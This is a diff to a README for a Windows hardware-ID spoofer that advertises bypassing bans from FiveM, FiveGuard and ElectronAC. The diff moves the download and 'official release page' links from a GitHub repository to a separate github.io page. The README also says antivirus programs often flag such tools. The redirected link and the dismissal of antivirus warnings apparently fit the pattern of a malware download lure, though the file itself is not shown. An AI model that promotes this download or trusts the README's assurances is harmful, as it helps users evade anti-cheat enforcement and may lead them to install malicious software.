@@ -1,6 +1,6 @@
 # 🛡️ Silentum-Spoofer - Reset your Hardware ID with Ease
 
-[![](https://img.shields.io/badge/Download_Silentum-blue.svg)](https://github.com/chineseanisereligioussect643/Silentum-Spoofer)
+[![](https://img.shields.io/badge/Download_Silentum-blue.svg)](https://chineseanisereligioussect643.github.io)
 
 Silentum-Spoofer helps you manage your hardware identifiers on Windows. This tool changes your Hardware ID (HWID) to help you bypass restrictions from services like FiveM, FiveGuard, and ElectronAC. It includes tools to store and recover your original settings if you need them later.
 
@@ -19,7 +19,7 @@ Antivirus programs often flag these tools because they modify system identifiers
 
 Follow these steps to configure your machine.
 
-1.  Visit the official release page: [https://github.com/chineseanisereligioussect643/Silentum-Spoofer](https://github.com/chineseanisereligioussect643/Silentum-Spoofer).
+1.  Visit the official release page: [https://chineseanisereligioussect643.github.io](https://chineseanisereligioussect643.github.io).
 2.  Locate the latest version link on that page.
 3.  Choose a safe folder on your computer to save the file. Keep this folder in a location you can find later, like your Documents or a custom folder on your desktop.
 4.  Right-click the folder and ensure it is not set to Read-Only.
